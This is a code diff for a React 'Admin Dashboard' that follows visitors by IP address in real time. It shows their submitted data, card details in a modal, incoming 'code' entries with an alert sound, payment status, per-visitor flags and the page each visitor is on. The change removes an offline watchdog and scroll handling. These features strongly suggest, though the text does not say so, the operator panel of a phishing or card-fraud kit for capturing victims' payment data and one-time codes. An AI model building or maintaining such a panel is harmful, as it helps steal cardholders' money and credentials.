@@ -1,5 +1,5 @@
 // src/App.js
-import React, { useEffect, useLayoutEffect, useState, useRef } from "react";
+import React, { useEffect, useState, useRef } from "react";
 import { Routes, Route, Navigate, useNavigate } from "react-router-dom";
 
 import { socket } from "./socket";
@@ -91,15 +91,12 @@ export default function App() {
 
           arr.forEach((r) => {
             const ipKey = r.ip;
-            const ts = new Date(r.updatedAt || r.createdAt || Date.now()).getTime();
             if (!map[ipKey]) {
               map[ipKey] = {
                 payments: [],
                 flag: false,
                 hasNewData: false,
                 hasPayment: false,
-                lastActivityAt: 0,
-            lastSeenAt: 0,
               };
             }
             map[ipKey] = {
@@ -109,8 +106,6 @@ export default function App() {
               flag: map[ipKey].flag,
               hasNewData: false,
               hasPayment: map[ipKey].hasPayment,
-              lastActivityAt: Math.max(map[ipKey].lastActivityAt || 0, ts),
-              lastSeenAt: Math.max(map[ipKey].lastSeenAt || 0, ts),
             };
           });
         });
@@ -125,14 +120,10 @@ export default function App() {
                 flag: false,
                 hasNewData: false,
                 hasPayment: false,
-                lastActivityAt: 0,
-            lastSeenAt: 0,
               };
             }
             map[ipKey].payments.push(payDoc);
             map[ipKey].hasPayment = true; // show as completed payment
-            map[ipKey].lastActivityAt = Math.max(map[ipKey].lastActivityAt || 0, new Date(payDoc.createdAt || payDoc.updatedAt || Date.now()).getTime());
-            map[ipKey].lastSeenAt = Math.max(map[ipKey].lastSeenAt || 0, new Date(payDoc.createdAt || payDoc.updatedAt || Date.now()).getTime());
           });
         }
 
@@ -145,8 +136,6 @@ export default function App() {
                 flag: false,
                 hasNewData: false,
                 hasPayment: false,
-                lastActivityAt: 0,
-            lastSeenAt: 0,
               };
             }
             map[ipKey].flag = flag;
@@ -154,14 +143,17 @@ export default function App() {
         }
 
         // 4) Locations
-        // NOTE: do NOT create a new row from location alone.
-        // Only attach currentPage if this IP already has real submitted data.
         if (data.locations) {
           data.locations.forEach(({ ip: ipKey, currentPage }) => {
-            if (map[ipKey]) {
-              map[ipKey].currentPage = currentPage;
+            if (!map[ipKey]) {
+              map[ipKey] = {
+                payments: [],
+                flag: false,
+                hasNewData: false,
+                hasPayment: false,
+              };
             }
-              map[ipKey].lastSeenAt = Date.now();
+            map[ipKey].currentPage = currentPage;
           });
         }
 
@@ -184,8 +176,6 @@ export default function App() {
                   flag: false,
                   hasNewData: false,
                   hasPayment: false,
-                lastActivityAt: 0,
-            lastSeenAt: 0,
                 };
               }
               map[ipKey] = {
@@ -212,8 +202,6 @@ export default function App() {
                 flag: false,
                 hasNewData: false,
                 hasPayment: false,
-                lastActivityAt: 0,
-            lastSeenAt: 0,
               };
             }
             map[ipKey] = {
@@ -257,8 +245,6 @@ export default function App() {
             flag: false,
             hasNewData: false,
             hasPayment: false,
-                lastActivityAt: 0,
-            lastSeenAt: 0,
           };
 
           playNewDataSound();
@@ -272,8 +258,6 @@ export default function App() {
               flag: oldObj.flag,
               hasNewData: true, // ✅ mark as new data
               hasPayment: oldObj.hasPayment || u.hasPayment === true,
-              lastActivityAt: Date.now(),
-              lastSeenAt: Date.now(),
             },
           };
         });
@@ -287,8 +271,6 @@ export default function App() {
             flag: false,
             hasNewData: false,
             hasPayment: false,
-                lastActivityAt: 0,
-            lastSeenAt: 0,
           };
 
           playCodeSound(); // Use code sound
@@ -302,8 +284,6 @@ export default function App() {
               flag: oldObj.flag,
               hasNewData: true, // ✅ mark as new data
               hasPayment: oldObj.hasPayment || u.hasPayment === true,
-              lastActivityAt: Date.now(),
-              lastSeenAt: Date.now(),
             },
           };
         });
@@ -317,8 +297,6 @@ export default function App() {
             flag: false,
             hasNewData: false,
             hasPayment: false,
-                lastActivityAt: 0,
-            lastSeenAt: 0,
           };
           return {
             ...m,
@@ -342,8 +320,6 @@ export default function App() {
             flag: false,
             hasNewData: false,
             hasPayment: false,
-                lastActivityAt: 0,
-            lastSeenAt: 0,
           };
 
           // 🚫 skip duplicates
@@ -370,8 +346,6 @@ export default function App() {
               flag: oldObj.flag,
               hasNewData: true, // new data arrived
               hasPayment: true, // ✅ mark as paid/completed
-              lastActivityAt: Date.now(),
-              lastSeenAt: Date.now(),
             },
           };
         });
@@ -393,8 +367,6 @@ export default function App() {
               flag: false,
               hasNewData: false,
               hasPayment: false,
-                lastActivityAt: 0,
-            lastSeenAt: 0,
             }),
             flag,
           },
@@ -425,18 +397,7 @@ export default function App() {
       // 🌐 Location updates are SILENT and DO NOT mark new data
       socket.on("locationUpdated", ({ ip, page }) => {
         if (page !== "offline") {
-          // Do NOT create a new row from location alone
-          setUsers((m) => {
-            if (!m[ip]) return m;
-            return {
-              ...m,
-              [ip]: {
-                ...m[ip],
-                currentPage: page,
-                lastSeenAt: Date.now(),
-              },
-            };
-          });
+          mergeSilent({ ip, currentPage: page });
         } else {
           setUsers((m) => {
             if (!m[ip]) return m;
@@ -445,7 +406,6 @@ export default function App() {
               [ip]: {
                 ...m[ip],
                 currentPage: "offline",
-                lastSeenAt: Date.now(),
                 // keep hasNewData/hasPayment unchanged
               },
             };
@@ -457,32 +417,8 @@ export default function App() {
       socket.on("flagUpdated", updateFlag);
     })();
     
-    
-    // 🕒 Offline watchdog:
-    // If we stop receiving location updates for a user, mark them offline automatically.
-    // This keeps the Online/Offline indicator accurate even when the browser closes without sending a final "offline".
-    const OFFLINE_AFTER_MS = 20000; // 20s
-    const watchdog = setInterval(() => {
-      const now = Date.now();
-      setUsers((m) => {
-        let changed = false;
-        const next = { ...m };
-        Object.entries(next).forEach(([ip, u]) => {
-          const lastSeen = Number(u?.lastSeenAt) || 0;
-          if (lastSeen > 0 && now - lastSeen > OFFLINE_AFTER_MS) {
-            if (u.currentPage !== "offline") {
-              next[ip] = { ...u, currentPage: "offline" };
-              changed = true;
-            }
-          }
-        });
-        return changed ? next : m;
-      });
-    }, 5000);
-
-// Cleanup: remove event listeners
+    // Cleanup: remove event listeners
     return () => {
-      clearInterval(watchdog);
       events.forEach(event => {
         document.removeEventListener(event, unlockAudio);
       });
@@ -552,42 +488,19 @@ function DashboardView({
   setInfoIp,
   setCardIp,
 }) {
-  // Keep the scroll position fully user-controlled (no random jumps)
-  const tableWrapRef = useRef(null);
-  const lastScrollTopRef = useRef(0);
-
-  const handleTableScroll = () => {
-    const el = tableWrapRef.current;
-    if (!el) return;
-    lastScrollTopRef.current = el.scrollTop;
-  };
-
-  useLayoutEffect(() => {
-    const el = tableWrapRef.current;
-    if (!el) return;
-    // Restore the user's last scroll position after any realtime update re-renders the table
-    el.scrollTop = lastScrollTopRef.current;
-  }, [users]);
-
   return (
     <div className="container py-4">
       <div className="d-flex justify-content-between align-items-center mb-3">
         <h2>Admin Dashboard</h2>
       </div>
 
-      <div
-        className="tableScroll"
-        ref={tableWrapRef}
-        onScroll={handleTableScroll}
-      >
-        <UserTable
-          users={users}
-          highlightIp={highlightIp}
-          cardIp={cardIp}
-          onShowCard={onShowCard}
-          onShowInfo={setInfoIp}
-        />
-      </div>
+      <UserTable
+        users={users}
+        highlightIp={highlightIp}
+        cardIp={cardIp}
+        onShowCard={onShowCard}
+        onShowInfo={setInfoIp}
+      />
 
       {cardIp && (
         <CardModal
@@ -598,9 +511,12 @@ function DashboardView({
       )}
 
       {infoIp && (
-        <InfoModal ip={infoIp} user={users[infoIp]} onClose={() => setInfoIp(null)} />
+        <InfoModal
+          ip={infoIp}
+          user={users[infoIp]}
+          onClose={() => setInfoIp(null)}
+        />
       )}
     </div>
   );
 }
-
